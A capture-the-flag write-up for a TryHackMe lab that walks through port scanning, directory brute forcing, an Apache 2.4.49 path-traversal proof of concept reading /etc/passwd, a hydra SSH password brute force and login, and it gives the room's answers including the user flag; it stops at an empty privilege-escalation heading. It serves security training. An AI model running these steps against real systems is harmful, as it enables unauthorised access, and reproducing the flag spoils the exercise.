
# THM-basiclevelctf-Writeup
https://tryhackme.com/room/basiclevelctf

The first step is to find out which ports are open.

```
nmap -sCV -vv 192.168.1.19
```
![NMAP Resulst](images/nmap.png "NMAP")

From the output of nmap now we know that there are 2 open ports,
that is: port 22 that is running SSH, Port 80 running a http webserver.

1. Q: What are the names of the services on the open ports?
A: ssh,http

# Accessing the Webserver
We access port 80 and this is the result we get.

![Webserver](images/index.png)



# Finding directory

To find other pages or directories that may exist within the server
we can use any directory brute-force tools such as dirbuster,
gobuster, dirsearch etc. But In my case I want to use dirb.

```
dirb http://192.168.1.19/
```
![dirb](images/dirb.png)

# Checking robots.txt
After checking **robots.txt**, we realized that there is a file named **secret.lst** thanks to robots.txt and it is most likely a wordlist.

![robots.txt](images/robots.png)

![secret.lst](images/secretlst.png)

# Check exploit for open port 22 or 80
Now we only have a wordlist and the ssh service is open. But we did not investigate whether the service running on port 80 has any vulnerability, let's start researching.

![exploit](images/exploit.png)

It seems that the Apache HTTP Server 2.4.49 service has a vulnerability. Let's download the code and test it on our target machine. 
Reference: https://www.exploit-db.com/exploits/50406
```
chmod +x PoC.sh
echo "http://192.168.1.19" > targets.txt
./PoC.sh targets.txt /etc/passwd
```
![readpasswd](images/readpasswd.png)
Yes, we detected a "Path Traversal" vulnerability on our target machine.
And in this way, we have detected the user named **h1ddenuser** by reading the /etc/passwd file.

# SSH Bruteforce
I will use the **hydra** tool to make a bruteforce attack, you can use any tool you want.
```
hydra -l h1ddenuser -P /home/user00/Downloads/secret.lst -t 64 ssh://192.168.1.19
```
![SSH Bruteforce Attack](images/hydra.png)
We found the password of the user named **h1ddenuser** with a brute-force attack. Let's log in!
```
ssh h1ddenuser@192.168.1.19
```
![We are in!](images/wearein.png)

# Let's find out what we have
```
cd ~
ls -la
```
![User.txt](images/usertxt.png)

2. Q:  user.txt 
A: THM{se3ms_l1ke_ez_f0r_y0u!}

# Privilege Escalation
